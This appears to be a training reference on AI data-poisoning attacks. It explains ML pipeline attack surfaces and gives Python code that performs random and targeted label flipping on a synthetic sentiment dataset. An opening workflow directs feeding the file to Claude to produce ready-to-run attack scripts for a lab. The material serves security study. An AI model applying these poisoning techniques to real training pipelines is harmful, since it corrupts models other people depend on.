# Quick Reference
| Attack                            | Description                                                                                                                                                                                                                   |
| --------------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **Label Flipping**                | Swap training labels (e.g., `cat` → `dog`) to degrade overall model accuracy; features stay untouched.                                                                                                                        |
| **Targeted Label Flipping**       | Flip labels only for a specific class or region of the feature space, causing selective misclassification rather than broad accuracy loss.                                                                                    |
| **Feature / Clean Label Attack**  | Perturb training _features_ while keeping labels correct, pushing data points across decision boundaries to cause targeted misclassification at inference.                                                                    |
| **Trojan / Backdoor Attack**      | Embed a hidden trigger pattern into a subset of training images with relabeled targets; the model performs normally on clean inputs but misclassifies whenever the trigger is present.                                        |
| **Pickle Deserialization Attack** | Exploit Python's `pickle.load()` (used internally by `torch.load()`) to execute arbitrary code when a model file is loaded, via a malicious `__reduce__` method on a crafted object.                                          |
| **Tensor Steganography**          | Hide data (payloads, config, malware) inside a model's weight tensors by flipping least significant bits of floating-point parameters, causing negligible impact on model performance while smuggling information undetected. |
___
### Workflow

1. Feed this `.md` file to Claude as context so it understands the attack techniques, code patterns, and evaluation methods.
2. Tell Claude which attack you need to conduct (e.g., "I need to perform a trojan attack on MNIST targeting class 7 → 1") along with any provided templates, notebooks, or target endpoints.
3. Claude generates a standalone `.py` script (or completed notebook) with all TODOs filled in, ready to run.
4. Transfer the script into your attack container / VM and execute it:

```bash
# Install dependencies (first time only)
uv venv
source .venv/bin/activate
uv pip install torch torchvision numpy requests pandas scikit-learn matplotlib

# Run the attack
uv run python3 attack_script.py
```

5. Capture the flag or results from the evaluator response.
# Introduction
### Introduction to AI Data

AI systems are fundamentally data-driven — their performance, reliability, and security are linked to the quality, integrity, and confidentiality of the data they consume and produce.

At the heart of most AI implementations lies a **data pipeline**: a sequence of steps designed to collect, process, transform, and ultimately utilize data for tasks such as training models or generating predictions.
##### Data Collection

The process begins with **data collection** — gathering raw information from various sources:

- User interactions from web apps as JSON logs streamed via messaging queues like **Apache Kafka**
- Structured transaction records from SQL databases like **PostgreSQL**
- Sensor readings via **MQTT** from IoT devices
- Scraping public websites using tools like **Scrapy**
- Receiving batch files (CSV, Parquet) from third parties

Data can range from images (JPEG) and audio (WAV) to complex semi-structured formats. The initial quality and integrity of collected data profoundly impacts all downstream processes.
##### Storage

Choice of storage technology depends on data structure, volume, and access patterns:

- **Relational databases** (PostgreSQL) for structured data
- **NoSQL databases** (MongoDB) for semi-structured logs
- **Data lakes** on distributed file systems (Hadoop HDFS) or cloud object storage (AWS S3, Azure Blob Storage)
- **Time-series databases** (InfluxDB) for time-series data

Trained models become stored artifacts serialized into formats like Python's **pickle** (`.pkl`), **ONNX**, or framework-specific files (`.pt`, `.pth`, `.safetensors`) — each presenting unique security considerations if handled improperly.

##### Data Processing

Raw data undergoes cleaning, normalization, and feature engineering:

- Handling missing values using **Pandas** and **scikit-learn's Imputers**
- Feature scaling with **StandardScaler** or **MinMaxScaler**
- Text tokenization and embedding using **NLTK** or **spaCy**
- Image augmentation using **OpenCV** or **Pillow**
- Large datasets use distributed processing (**Apache Spark**, **Dask**) with orchestration tools (**Apache Airflow**, **Kubeflow Pipelines**)

##### Modeling

Data scientists explore data in **Jupyter Notebooks** and train models using **scikit-learn**, **TensorFlow**, **Jax**, or **PyTorch**. This iterative process involves selecting algorithms, tuning hyperparameters (using tools like **Optuna**), and validating performance. Cloud platforms like **AWS SageMaker** or **Azure ML** provide integrated environments.

##### Deployment

Models are deployed as:

- **REST APIs** using **Flask** or **FastAPI**, containerized with **Docker** and orchestrated by **Kubernetes**
- **Serverless functions** (AWS Lambda)
- **Embedded** directly into applications or edge devices (TensorFlow Lite)

##### Monitoring and Maintenance

Deployed models are observed for operational health using **Prometheus** and **Grafana**, while ML monitoring platforms (**WhyLabs**, **Arize AI**) track data drift, concept drift, and prediction quality. Feedback is logged and processed alongside new data for periodic retraining — creating a significant attack vector via feedback loop poisoning.

---

### AI Data Attacks
Unlike evasion attacks (manipulating inputs to fool a deployed model) or privacy attacks (extracting sensitive info), AI data attacks fundamentally undermine the model's integrity by corrupting its foundation: the data it learns from or the format it's stored in.
##### Attack Surface by Pipeline Stage

**Data Collection** — Primary threat is **initial data poisoning**: injecting malicious data (fake reviews, altered metadata, mislabeled samples).

**Storage** — Traditional data security threats plus model-specific risks. Unauthorized access to S3/secure storage could allow theft or tampering of datasets. Stored model files (`.pkl`, `.pt`) are targets for **trojan replacement** or **model steganography** (hiding code within model files via insecure deserialization like `pickle.load()`).

**Data Processing** — Compromising processing scripts can corrupt data before modeling (e.g., mislabeling review sentiments, introducing subtle errors into standardized images).

**Analysis & Modeling** — Where data poisoning becomes concrete. Training on poisoned data means the model learns incorrect patterns, exhibits biases, or contains hidden backdoors.

**Deployment** — Model artifact integrity is crucial. Insecure loading mechanisms could allow injection of malicious model files (trojan/steganography).

**Monitoring & Maintenance** — Retraining pipelines are prime targets for **online poisoning**. Attackers submit manipulated feedback, altered clickstream data, or misleading labels to gradually corrupt models.

##### Mapping to Security Frameworks

**OWASP LLM03: Training Data Poisoning** — Attackers manipulate data during collection, processing, training, or feedback stages.

**OWASP LLM05: Supply Chain Vulnerabilities** — Compromising third-party data sources, tampering with pre-trained model artifacts (trojans), or exploiting pipeline infrastructure vulnerabilities.

**Google SAIF (Secure AI Framework)** — Lifecycle-oriented perspective covering Secure Design, Data Supply Chain, Security Testing during model development, Secure Deployment, and Secure Monitoring & Response.

---

# Label Attacks

### Label Flipping
The simplest data poisoning attack. An adversary gains access to training data and deliberately changes assigned labels while leaving features untouched (e.g., `cat` → `dog`, `spam` → `not spam`).

**Goal:** Degrade model performance by forcing it to learn incorrect feature-label associations, reducing accuracy, precision, recall, etc.

**OWASP:** LLM03 — Training Data Poisoning

**Pipeline target:** Typically the **Storage** stage — modifying label columns in CSV files on S3, manipulating DB records, or compromising **Data Processing** scripts that alter labels during transformation.
##### Hypothetical Example

To demonstrate how such an attack would work, we will build a model around the sentiment analysis scenario. A company is training a model to classify customer feedback as `positive` or `negative`, and we, as the adversary, will attack the training dataset by flipping labels.

Setup
```python
import numpy as np
import matplotlib.pyplot as plt
from sklearn.datasets import make_blobs
from sklearn.model_selection import train_test_split
from sklearn.linear_model import LogisticRegression
from sklearn.metrics import accuracy_score, classification_report, confusion_matrix
import seaborn as sns

htb_green = "#9fef00"
node_black = "#141d2b"
hacker_grey = "#a4b1cd"
white = "#ffffff"
azure = "#0086ff"
nugget_yellow = "#ffaf00"
malware_red = "#ff3e3e"
vivid_purple = "#9f00ff"
aquamarine = "#2ee7b6"

# Configure plot styles
plt.style.use("seaborn-v0_8-darkgrid")
plt.rcParams.update(
    {
        "figure.facecolor": node_black,
        "axes.facecolor": node_black,
        "axes.edgecolor": hacker_grey,
        "axes.labelcolor": white,
        "text.color": white,
        "xtick.color": hacker_grey,
        "ytick.color": hacker_grey,
        "grid.color": hacker_grey,
        "grid.alpha": 0.1,
        "legend.facecolor": node_black,
        "legend.edgecolor": hacker_grey,
        "legend.frameon": True,
        "legend.framealpha": 1.0,
        "legend.labelcolor": white,
    }
)

# Seed for reproducibility
SEED = 1337
np.random.seed(SEED)

print("Setup complete. Libraries imported and styles configured.")
```

Synthetic dataset using `make_blobs` — two Gaussian clusters in 2D feature space representing Negative (Class 0) and Positive (Class 1) sentiment. The dimensions simulate features derived from text preprocessing (TF-IDF, embeddings, etc.).

Dataset
```python
# Generate synthetic data
n_samples = 1000
centers = [(0, 5), (5, 0)]  # Define centers for two distinct blobs
X, y = make_blobs(
    n_samples=n_samples,
    centers=centers,
    n_features=2,
    cluster_std=1.25,
    random_state=SEED,
)

# Split data into training and testing sets
X_train, X_test, y_train, y_test = train_test_split(
    X, y, test_size=0.3, random_state=SEED
)

print(f"Generated {n_samples} samples.")
print(f"Training set size: {X_train.shape[0]} samples.")
print(f"Testing set size: {X_test.shape[0]} samples.")
print(f"Number of features: {X_train.shape[1]}")
print(f"Classes: {np.unique(y)}")
```

Plot the dataset to easily see relations in the data
```python
def plot_data(X, y, title="Dataset Visualization"):
    """
    Plots the 2D dataset with class-specific colors.

    Parameters:
    - X (np.ndarray): Feature data (n_samples, 2).
    - y (np.ndarray): Labels (n_samples,).
    - title (str): The title for the plot.
    """
    plt.figure(figsize=(12, 6))
    scatter = plt.scatter(
        X[:, 0],
        X[:, 1],
        c=y,
        cmap=plt.cm.colors.ListedColormap([azure, nugget_yellow]),
        edgecolors=node_black,
        s=50,
        alpha=0.8,
    )
    plt.title(title, fontsize=16, color=htb_green)
    plt.xlabel("Sentiment Feature 1", fontsize=12)
    plt.ylabel("Sentiment Feature 2", fontsize=12)
    # Create a legend
    handles = [
        plt.Line2D(
            [0],
            [0],
            marker="o",
            color="w",
            label="Negative Sentiment (Class 0)", 
            markersize=10,
            markerfacecolor=azure,
        ),
        plt.Line2D(
            [0],
            [0],
            marker="o",
            color="w",
            label="Positive Sentiment (Class 1)",
            markersize=10,
            markerfacecolor=nugget_yellow,
        ),
    ]
    plt.legend(handles=handles, title="Sentiment Classes")
    plt.grid(True, color=hacker_grey, linestyle="--", linewidth=0.5, alpha=0.3)
    plt.show()


# Plot the data
plot_data(X_train, y_train, title="Original Training Data Distribution")
```

---
### Baseline Logistic Regression Model

We must establish baseline performance on clean data before attacking. We will train a `Logistic Regression` model on the original, clean training data.

We now train this baseline model on our clean data and evaluate its accuracy on unseen test set.
```python
# Initialize and train the Logistic Regression model
baseline_model = LogisticRegression(random_state=SEED)
baseline_model.fit(X_train, y_train)

# Predict on the test set
y_pred_baseline = baseline_model.predict(X_test)

# Calculate baseline accuracy
baseline_accuracy = accuracy_score(y_test, y_pred_baseline)
print(f"Baseline Model Accuracy: {baseline_accuracy:.4f}")


# Prepare to plot the decision boundary
def plot_decision_boundary(model, X, y, title="Decision Boundary"):
    """
    Plots the decision boundary of a trained classifier on a 2D dataset.

    Parameters:
    - model: The trained classifier object (must have a .predict method).
    - X (np.ndarray): Feature data (n_samples, 2).
    - y (np.ndarray): Labels (n_samples,).
    - title (str): The title for the plot.
    """
    h = 0.02  # Step size in the mesh
    x_min, x_max = X[:, 0].min() - 1, X[:, 0].max() + 1
    y_min, y_max = X[:, 1].min() - 1, X[:, 1].max() + 1
    xx, yy = np.meshgrid(np.arange(x_min, x_max, h), np.arange(y_min, y_max, h))

    # Predict the class for each point in the mesh
    Z = model.predict(np.c_[xx.ravel(), yy.ravel()])
    Z = Z.reshape(xx.shape)

    plt.figure(figsize=(12, 6))
    # Plot the decision boundary contour
    plt.contourf(
        xx, yy, Z, cmap=plt.cm.colors.ListedColormap([azure, nugget_yellow]), alpha=0.3
    )

    # Plot the data points
    scatter = plt.scatter(
        X[:, 0],
        X[:, 1],
        c=y,
        cmap=plt.cm.colors.ListedColormap([azure, nugget_yellow]),
        edgecolors=node_black,
        s=50,
        alpha=0.8,
    )

    plt.title(title, fontsize=16, color=htb_green)
    plt.xlabel("Feature 1", fontsize=12)
    plt.ylabel("Feature 2", fontsize=12)

    # Create a legend manually
    handles = [
        plt.Line2D(
            [0],
            [0],
            marker="o",
            color="w",
            label="Negative Sentiment (Class 0)",
            markersize=10,
            markerfacecolor=azure,
        ),
        plt.Line2D(
            [0],
            [0],
            marker="o",
            color="w",
            label="Positive Sentiment (Class 1)",
            markersize=10,
            markerfacecolor=nugget_yellow,
        ),
    ]
    plt.legend(handles=handles, title="Classes")
    plt.grid(True, color=hacker_grey, linestyle="--", linewidth=0.5, alpha=0.3)
    plt.xlim(xx.min(), xx.max())
    plt.ylim(yy.min(), yy.max())
    plt.show()


# Plot the decision boundary for the baseline model
plot_decision_boundary(
    baseline_model,
    X_train,
    y_train,
    title=f"Baseline Model Decision Boundary\nAccuracy: {baseline_accuracy:.4f}",
)
```
The resulting plot shows a linear decision boundary learned by the baseline model, separating Negative and Positive sentiment clusters in the training data,

---
### The Label Flipping Attack

With an established baseline, we can now execute the actual attack, and to do this, we will create a function that will take the original training labels (`y_train`, representing the true sentiments) and a `poisoning percentage` as input. It will randomly select the specified fraction of training data points (reviews) and flip their labels - changing `Negative` (0) to `Positive` (1) and `Positive` (1) to `Negative` (0).
##### `flip_labels`

Defining the function - Ensure `poison_percentage` argument is valid between 0 and 1.
```python
def flip_labels(y, poison_percentage):
    if not 0 <= poison_percentage <= 1:
        raise ValueError("poison_percentage must be between 0 and 1.")

    n_samples = len(y)
    n_to_flip = int(n_samples * poison_percentage)

    if n_to_flip == 0:
        print("Warning: Poison percentage is 0 or too low to flip any labels.")
        # Return unchanged labels and empty indices if no flips are needed
        return y.copy(), np.array([], dtype=int)
```

Next, we select which specific reviews (data points) will have their sentiment labels flipped.
```python
    # Use the defined SEED for the random number generator
    rng_instance = np.random.default_rng(SEED)
    # Select unique indices to flip
    flipped_indices = rng_instance.choice(n_samples, size=n_to_flip, replace=False)
```

Perform actual label flipping
```python
    # Create a copy to avoid modifying the original array
    y_poisoned = y.copy()

    # Get the original labels at the indices we are about to flip
    original_labels_at_flipped = y_poisoned[flipped_indices]

    # Apply the flip: if original was 0, set to 1; otherwise (if 1), set to 0
    y_poisoned[flipped_indices] = np.where(original_labels_at_flipped == 0, 1, 0)

    print(f"Flipping {n_to_flip} labels ({poison_percentage * 100:.1f}%).")
```

Return the poisoned array
```python
    return y_poisoned, flipped_indices
```

Function to plot the data to see effects of the attack
```python
def plot_poisoned_data(
    X,
    y_original,
    y_poisoned,
    flipped_indices,
    title="Poisoned Data Visualization",
    target_class_info=None,
):
    """
    Plots a 2D dataset, highlighting points whose labels were flipped.

    Parameters:
    - X (np.ndarray): Feature data (n_samples, 2).
    - y_original (np.ndarray): The original labels before flipping (used for context if needed, currently unused in logic but good practice).
    - y_poisoned (np.ndarray): Labels after flipping.
    - flipped_indices (np.ndarray): Indices of the samples that were flipped.
    - title (str): The title for the plot.
    - target_class_info (int, optional): The class label of the points that were targeted for flipping. Defaults to None.
    """
    plt.figure(figsize=(12, 7))

    # Identify non-flipped points
    mask_not_flipped = np.ones(len(y_poisoned), dtype=bool)
    mask_not_flipped[flipped_indices] = False

    # Plot non-flipped points (color by their poisoned label, which is same as original)
    plt.scatter(
        X[mask_not_flipped, 0],
        X[mask_not_flipped, 1],
        c=y_poisoned[mask_not_flipped],
        cmap=plt.cm.colors.ListedColormap([azure, nugget_yellow]),
        edgecolors=node_black,
        s=50,
        alpha=0.6,
        label="Unchanged Label",  # Keep this generic
    )

    # Determine the label for flipped points in the legend
    if target_class_info is not None:
        flipped_legend_label = f"Flipped (Orig Class {target_class_info})"
        # You could potentially use target_class_info to adjust facecolor if needed,
        # but current logic colors by the new label which is often clearer.
    else:
        flipped_legend_label = "Flipped Label"

    # Plot flipped points with a distinct marker and outline
    if len(flipped_indices) > 0:
        # Color flipped points according to their new (poisoned) label
        plt.scatter(
            X[flipped_indices, 0],
            X[flipped_indices, 1],
            c=y_poisoned[flipped_indices],  # Color by the new label
            cmap=plt.cm.colors.ListedColormap([azure, nugget_yellow]),
            edgecolors=malware_red,  # Highlight edge in red
            linewidths=1.5,
            marker="X",  # Use 'X' marker
            s=100,
            alpha=0.9,
            label=flipped_legend_label,  # Use the determined label
        )

    plt.title(title, fontsize=16, color=htb_green)
    plt.xlabel("Feature 1", fontsize=12)
    plt.ylabel("Feature 2", fontsize=12)

    # Create legend
    handles = [
        plt.Line2D(
            [0],
            [0],
            marker="o",
            color="w",
            label="Class 0 Point (Azure)",
            markersize=10,
            markerfacecolor=azure,
            linestyle="None",
        ),
        plt.Line2D(
            [0],
            [0],
            marker="o",
            color="w",
            label="Class 1 Point (Yellow)",
            markersize=10,
            markerfacecolor=nugget_yellow,
            linestyle="None",
        ),
        # Add the flipped legend entry using the label
        plt.Line2D(
            [0],
            [0],
            marker="X",
            color="w",
            label=flipped_legend_label,
            markersize=12,
            markeredgecolor=malware_red,
            markerfacecolor=hacker_grey,
            linestyle="None",
        ),
    ]
    plt.legend(handles=handles, title="Data Points")
    plt.grid(True, color=hacker_grey, linestyle="--", linewidth=0.5, alpha=0.3)
    plt.show()
```

---

### Evaluating the Label Flipping Attack

Process per poisoning level: flip labels → train new model on `X_train` + poisoned `y` → evaluate on **clean** test set → visualize decision boundary.

##### 10% Poisoning

```python
results = {
    "percentage": [],
    "accuracy": [],
    "model": [],
    "y_train_poisoned": [],
    "flipped_indices": [],
}
decision_boundaries_data = []  # To store data for the combined plot

# Add baseline results first
results["percentage"].append(0.0)
results["accuracy"].append(baseline_accuracy)
results["model"].append(baseline_model)
results["y_train_poisoned"].append(y_train.copy())
results["flipped_indices"].append(np.array([], dtype=int))

# Calculate meshgrid once for all boundary plots
h = 0.02  # Step size in the mesh
x_min, x_max = X_train[:, 0].min() - 1, X_train[:, 0].max() + 1
y_min, y_max = X_train[:, 1].min() - 1, X_train[:, 1].max() + 1
xx, yy = np.meshgrid(np.arange(x_min, x_max, h), np.arange(y_min, y_max, h))
mesh_points = np.c_[xx.ravel(), yy.ravel()]

# Perform 10% Poisoning
poison_percentage_10 = 0.10
print(f"\n--- Testing with {poison_percentage_10 * 100:.0f}% Poisoned Data ---")

# Create 10% Poisoned Data
y_train_poisoned_10, flipped_indices_10 = flip_labels(y_train, poison_percentage_10)

# Visualize 10% Poisoned Data
plot_poisoned_data(
    X_train,
    y_train,
    y_train_poisoned_10,
    flipped_indices_10,
    title=f"Training Data with {poison_percentage_10 * 100:.0f}% Flipped Labels",
)

# Train Model on 10% Poisoned Data
model_10_percent = LogisticRegression(random_state=SEED)
model_10_percent.fit(X_train, y_train_poisoned_10)  # Train with original X, poisoned y

# Evaluate on Clean Test Data
y_pred_10_percent = model_10_percent.predict(X_test)
accuracy_10_percent = accuracy_score(y_test, y_pred_10_percent)
print(f"Accuracy on clean test set (10% poisoned): {accuracy_10_percent:.4f}")

# Store Results
results["percentage"].append(poison_percentage_10)
results["accuracy"].append(accuracy_10_percent)
results["model"].append(model_10_percent)
results["y_train_poisoned"].append(y_train_poisoned_10)
results["flipped_indices"].append(flipped_indices_10)

# Visualize Decision Boundary
plot_decision_boundary(
    model_10_percent,
    X_train,
    y_train_poisoned_10,  # Visualize boundary with poisoned labels shown
    title=f"Decision Boundary ({poison_percentage_10 * 100:.0f}% Poisoned)\nAccuracy: {accuracy_10_percent:.4f}",
)

# Store decision boundary prediction for combined plot
Z_10 = model_10_percent.predict(mesh_points)
Z_10 = Z_10.reshape(xx.shape)
decision_boundaries_data.append({"percentage": poison_percentage_10, "Z": Z_10})
print(
    f"Baseline accuracy was: {baseline_accuracy:.4f}"
)  # Print baseline for comparison
```

No accuracy loss with clearly separated data, but overlaying boundaries reveals the boundary **has shifted slightly**.

To get a clearer view of the shift, let's overlay the original `baseline boundary` (trained on clean data) and the `10% poisoned boundary` on the same plot.
```python
plt.figure(figsize=(12, 8))

# Plot the 10% poisoned data points for context
mask_not_flipped_10 = np.ones(len(y_train), dtype=bool)
mask_not_flipped_10[flipped_indices_10] = False
plt.scatter(
    X_train[mask_not_flipped_10, 0],
    X_train[mask_not_flipped_10, 1],
    c=y_train_poisoned_10[mask_not_flipped_10],
    cmap=plt.cm.colors.ListedColormap([azure, nugget_yellow]),
    edgecolors=node_black,
    s=50,
    alpha=0.6,
    label="Original Label (in 10% set)",
)

# Plot flipped points ('X' marker)
if len(flipped_indices_10) > 0:
    plt.scatter(
        X_train[flipped_indices_10, 0],
        X_train[flipped_indices_10, 1],
        c=y_train_poisoned_10[flipped_indices_10],  # Color by the new poisoned label
        cmap=plt.cm.colors.ListedColormap([azure, nugget_yellow]),
        edgecolors=malware_red,
        linewidths=1.5,
        marker="X",
        s=100,
        alpha=0.9,
        label="Flipped Label (10% set)",
    )

# Overlay Baseline Decision Boundary (Solid Green)
baseline_model_retrieved = results["model"][
    results["percentage"].index(0.0)
]  # Get baseline model
if baseline_model_retrieved:
    Z_baseline = baseline_model_retrieved.predict(mesh_points).reshape(xx.shape)
    plt.contour(
        xx,
        yy,
        Z_baseline,
        levels=[0.5],
        colors=[htb_green],
        linestyles=["solid"],
        linewidths=[2.5],
    )
else:
    print("Warning: Baseline model not found for comparison plot.")


# Overlay 10% Poisoned Decision Boundary
plt.contour(
    xx,
    yy,
    Z_10,
    levels=[0.5],
    colors=[aquamarine],
    linestyles=["dashed"],
    linewidths=[2.5],
)


plt.title(
    "Comparison: Baseline vs. 10% Poisoned Decision Boundary",
    fontsize=16,
    color=htb_green,
)
plt.xlabel("Feature 1", fontsize=12)
plt.ylabel("Feature 2", fontsize=12)

# Create legend
handles = [
    plt.Line2D(
        [0],
        [0],
        color=htb_green,
        lw=2.5,
        linestyle="solid",
        label="Baseline Boundary (0%)",
    ),
    plt.Line2D(
        [0],
        [0],
        color=aquamarine,
        lw=2.5,
        linestyle="dashed",
        label="Poisoned Boundary (10%)",
    ),
    plt.Line2D(
        [0],
        [0],
        marker="o",
        color="w",
        label="Class 0 Point",
        markersize=10,
        markerfacecolor=azure,
        linestyle="None",
    ),
    plt.Line2D(
        [0],
        [0],
        marker="o",
        color="w",
        label="Class 1 Point",
        markersize=10,
        markerfacecolor=nugget_yellow,
        linestyle="None",
    ),
    plt.Line2D(
        [0],
        [0],
        marker="X",
        color="w",
        label="Flipped Point",
        markersize=10,
        markeredgecolor=malware_red,
        markerfacecolor=hacker_grey,
        linestyle="None",
    ),
]
plt.legend(handles=handles, title="Boundaries & Data Points")
plt.grid(True, color=hacker_grey, linestyle="--", linewidth=0.5, alpha=0.3)
plt.xlim(xx.min(), xx.max())
plt.ylim(yy.min(), yy.max())
plt.show()

```
##### 20% through 50%

```python
poison_percentages_high = [0.20, 0.30, 0.40, 0.50]

for pp in poison_percentages_high:
    print(f"\n--- Training with {pp * 100:.0f}% Poisoned Data ---")

    # Create Poisoned Data
    y_train_poisoned, flipped_idx = flip_labels(y_train, pp)

    # Train Model on Poisoned Data
    poisoned_model = LogisticRegression(random_state=SEED)
    try:
        poisoned_model.fit(
            X_train, y_train_poisoned
        )  # Train with original X, but poisoned y
    except Exception as e:
        print(f"Error training model at {pp * 100}% poisoning: {e}")
        results["percentage"].append(pp)
        results["accuracy"].append(np.nan)  # Indicate failure
        results["model"].append(None)
        results["y_train_poisoned"].append(
            y_train_poisoned
        )  # Still store poisoned labels
        results["flipped_indices"].append(flipped_idx)  # and indices
        continue  # Skip to next percentage

    # Evaluate on Clean Test Data
    y_pred_poisoned = poisoned_model.predict(X_test)
    accuracy = accuracy_score(
        y_test, y_pred_poisoned
    )  # Always evaluate against TRUE test labels
    print(f"Accuracy on clean test set: {accuracy:.4f}")

    # Store Results
    results["percentage"].append(pp)
    results["accuracy"].append(accuracy)
    results["model"].append(poisoned_model)
    results["y_train_poisoned"].append(y_train_poisoned)
    results["flipped_indices"].append(flipped_idx)

    # Visualize Poisoned Data and Decision Boundary
    plot_poisoned_data(
        X_train,
        y_train,
        y_train_poisoned,
        flipped_idx,
        title=f"Training Data with {pp * 100:.0f}% Flipped Labels",
    )

    plot_decision_boundary(
        poisoned_model,
        X_train,
        y_train_poisoned,  # Visualize boundary with poisoned labels shown
        title=f"Decision Boundary ({pp * 100:.0f}% Poisoned)\nAccuracy: {accuracy:.4f}",
    )

    # Store decision boundary prediction for combined plot
    Z = poisoned_model.predict(mesh_points)
    Z = Z.reshape(xx.shape)
    decision_boundaries_data.append({"percentage": pp, "Z": Z})

print("\n--- Evaluation Complete for Higher Percentages ---")

```

##### Key Findings

- Boundary becomes **increasingly distorted** at each poisoning level
- Accuracy remains stable until ~50% due to well-separated synthetic data
- **In real-world data** (noisy, overlapping classes), even slight boundary shifts cause accuracy loss
- Overlaying all boundaries (0%–50%) on one plot clearly shows progressive distortion

Despite this no significant loss in accuracy until 50% of the data is poisoned, the `decison boundary` will still be constantly shifting. We can plot all of the boundaries overlaid into a single image to clearly visualize this phenomenon.
```python
plt.figure(figsize=(12, 8))

# Plot the original clean data points for reference
plt.scatter(
    X_train[:, 0],
    X_train[:, 1],
    c=y_train,
    cmap=plt.cm.colors.ListedColormap([azure, nugget_yellow]),
    edgecolors=node_black,
    s=50,
    alpha=0.5,
    label="Clean Data Points",
)

contour_colors = {
    0.0: htb_green,
    0.10: aquamarine,
    0.20: nugget_yellow,
    0.30: vivid_purple,
    0.40: azure,
    0.50: malware_red,
}
contour_linestyles = {
    0.0: "solid",
    0.10: "dashed",
    0.20: "dashed",
    0.30: "dashed",
    0.40: "dashed",
    0.50: "dashed",
}

# Get baseline boundary data
baseline_model_idx = results["percentage"].index(0.0)
baseline_model_retrieved = results["model"][baseline_model_idx]
if baseline_model_retrieved:
    Z_baseline = baseline_model_retrieved.predict(mesh_points).reshape(xx.shape)
    cs = plt.contour(
        xx,
        yy,
        Z_baseline,
        levels=[0.5],
        colors=[contour_colors[0.0]],
        linestyles=[contour_linestyles[0.0]],
        linewidths=[2.5],
    )

boundary_indices_to_plot = [0.10, 0.20, 0.30, 0.40, 0.50]
plotted_percentages = [0.0]

# Sort decision_boundaries_data by percentage to ensure consistent plotting order
decision_boundaries_data.sort(key=lambda item: item["percentage"])

for data in decision_boundaries_data:
    pp = data["percentage"]
    if pp in boundary_indices_to_plot:
        if pp in contour_colors and pp in contour_linestyles:
            Z = data["Z"]
            cs = plt.contour(
                xx,
                yy,
                Z,
                levels=[0.5],
                colors=[contour_colors[pp]],
                linestyles=[contour_linestyles[pp]],
                linewidths=[2.5],
            )
            plotted_percentages.append(pp)
        else:
            print(f"Warning: Style not defined for {pp * 100}%, skipping contour.")


plt.title(
    "Shift in Decision Boundary with Increasing Label Flipping",
    fontsize=16,
    color=htb_green,
)
plt.xlabel("Feature 1", fontsize=12)
plt.ylabel("Feature 2", fontsize=12)

# Create legend
legend_handles = []
for pp in sorted(plotted_percentages):
    if (
        pp in contour_colors and pp in contour_linestyles
    ):  # Check again before creating legend entry
        legend_handles.append(
            plt.Line2D(
                [0],
                [0],
                color=contour_colors[pp],
                lw=2.5,
                linestyle=contour_linestyles[pp],
                label=f"Boundary ({pp * 100:.0f}% Poisoned)",
            )
        )

# Add legend for data points as well
data_handles = [
    plt.Line2D(
        [0],
        [0],
        marker="o",
        color="w",
        label="Class 0",
        markersize=10,
        markerfacecolor=azure,
        linestyle="None",
    ),
    plt.Line2D(
        [0],
        [0],
        marker="o",
        color="w",
        label="Class 1",
        markersize=10,
        markerfacecolor=nugget_yellow,
        linestyle="None",
    ),
]

plt.legend(handles=legend_handles + data_handles, title="Boundaries & Data")
plt.grid(True, color=hacker_grey, linestyle="--", linewidth=0.5, alpha=0.3)
plt.xlim(xx.min(), xx.max())
plt.ylim(yy.min(), yy.max())
plt.show()
```

---

### Targeted Label Attacks

Instead of general degradation, the adversary aims to **misclassify a specific target class** predictably. Same scenario, but now we specifically make the model misclassify **positive reviews (Class 1) as negative (Class 0)**.

##### Strategy

1. Identify all training samples of `target_class`
2. Calculate flip count based on `poison_percentage` applied **only to target class count**
3. Randomly select that many samples from the target class
4. Flip their labels to `new_class`

##### How Targeted Flipping Corrupts Learning

Adversary selects instances `(xj, yj)` where `yj = 1` and changes to `yj' = 0`:

- Model calculates high `pj` (features say Class 1)
- With original label (`yj=1`): loss = `−log(pj)` → **small**
- With flipped label (`yj'=0`): loss = `−log(1−pj)` → **very large** (since `1−pj ≈ 0`)

Forces the boundary to shift into the Class 1 region, making the model misclassify genuine Class 1 samples as Class 0.

##### `targeted_flip_labels` Implementation

```python
def targeted_flip_labels(y, poison_percentage, target_class, new_class, seed=1337):

    if not 0 <= poison_percentage <= 1:
        raise ValueError("poison_percentage must be between 0 and 1.")
    if target_class == new_class:
        raise ValueError("target_class and new_class cannot be the same.")
    # Ensure target_class and new_class are present in y
    unique_labels = np.unique(y)
    if target_class not in unique_labels:
         raise ValueError(f"target_class ({target_class}) does not exist in y.")
    if new_class not in unique_labels:
         raise ValueError(f"new_class ({new_class}) does not exist in y.")

    # Identify indices belonging to the target class
    target_indices = np.where(y == target_class)[0]
    n_target_samples = len(target_indices)

    if n_target_samples == 0:
        print(f"Warning: No samples found for target_class {target_class}. No labels flipped.")
        return y.copy(), np.array([], dtype=int)

    # Calculate the number of labels to flip within the target class
    n_to_flip = int(n_target_samples * poison_percentage)

    if n_to_flip == 0:
        print(f"Warning: Poison percentage ({poison_percentage * 100:.1f}%) is too low "
              f"to flip any labels in the target class (size {n_target_samples}).")
        return y.copy(), np.array([], dtype=int)

    # Use a dedicated random number generator instance with the specified seed
    rng_instance = np.random.default_rng(seed)

    # Randomly select indices from the target_indices subset to flip
    # These are indices relative to the target_indices array
    indices_within_target_set_to_flip = rng_instance.choice(
        n_target_samples, size=n_to_flip, replace=False
    )
    # Map these back to the original array indices
    flipped_indices = target_indices[indices_within_target_set_to_flip]

    # Create a copy to avoid modifying the original array
    y_poisoned = y.copy()

    # Perform the flip for the selected indices to the new class label
    y_poisoned[flipped_indices] = new_class
    
    print(f"Targeting Class {target_class} for flipping to Class {new_class}.")
    print(f"Identified {n_target_samples} samples of Class {target_class}.")
    print(f"Attempting to flip {poison_percentage * 100:.1f}% ({n_to_flip} samples) of these.")
    print(f"Successfully flipped {len(flipped_indices)} labels.")
    
    return y_poisoned, flipped_indices

# Generate poisoned data set
poison_percentage_targeted = 0.40  # Target 40%
target_class_to_flip = 1  # Target Class 1 (Positive)
new_label_for_flipped = 0  # Flip them to Class 0 (Negative)

# Use the function to create the poisoned dataset
y_train_targeted_poisoned, targeted_flipped_indices = targeted_flip_labels(
    y_train,
    poison_percentage_targeted,
    target_class_to_flip,
    new_label_for_flipped,
    seed=SEED,  # Use the global SEED for reproducibility
)

print("\n--- Visualizing Targeted Poisoned Data ---")
# Plot the result of the targeted flip
plot_poisoned_data(
    X_train,
    y_train,  # Pass original y
    y_train_targeted_poisoned,
    targeted_flipped_indices,
